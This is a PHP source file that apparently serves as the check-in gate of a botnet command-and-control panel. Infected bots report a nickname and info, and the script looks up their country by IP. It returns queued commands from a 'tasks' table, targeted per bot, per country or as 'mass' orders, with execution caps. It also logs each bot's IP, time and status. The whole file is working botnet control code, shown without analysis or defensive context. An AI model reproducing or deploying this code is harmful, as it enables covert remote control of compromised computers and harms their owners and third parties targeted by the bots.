<?
   include "options.php";
   global $mysql;
   $ipp = getenv("REMOTE_ADDR");
   $gi = geoip_open("./GeoIP.dat", GEOIP_STANDARD);
   $c = geoip_country_code_by_addr($gi, $ipp);
   if($c == ""){
        $c = "O1";
   }
   geoip_close($gi);
   $act = addslashes($_GET['act']);
   $nick = addslashes($_GET['nick']);
   $info = addslashes($_GET['info']);

// _____________________________________________________________________________
// Connect to MySQL server

   if (@!mysql_connect($mysql['host'], $mysql['user'], $mysql['pass']))
        return;

   if (@!mysql_select_db($mysql['dbname']))
        return;
// _____________________________________________________________________________
// Logining bot info

/* return command ****************/

   $r = mysql_query("select * from tasks where nick='$nick' and (country='all' or country='".addslashes($c)."') LIMIT 1");

   if (mysql_num_rows($r) == 0)
   {
        $r = mysql_query("select * from tasks where nick='mass' and (country='all' or country='".addslashes($c)."') LIMIT 0,1");
   }
   if (mysql_num_rows($r) == 1)
   {
        $f = mysql_fetch_array($r);
        if ($f['bnum'] > 0 && $f['executed'] >= $f['bnum'])
              $command = "wait";
        else {
              $command = $f['command'];
              mysql_query("update tasks set executed=executed+1 where nick='".$f['nick']."' and (country='all' or country='".addslashes($c)."') LIMIT 1");
        }
   }
   else $command = "wait";

   echo $command;

/* loginning bot info ************/

//   if(!$nick || !$info)
//        return;

   $ip = getenv("REMOTE_ADDR");
   $date = time();

   $r = mysql_query("select nick from stat where nick='$nick'");
   $found = mysql_num_rows($r);
   if ($found == 0)
   {
        mysql_query("insert into stat values ('$nick', '$ip', '$date', '$command', '$info', '$c')");
   } else {
        mysql_query("update stat set time='$date', command='$command', ip='$ip', info='$info', country='$c' where nick='$nick'");
   }
?>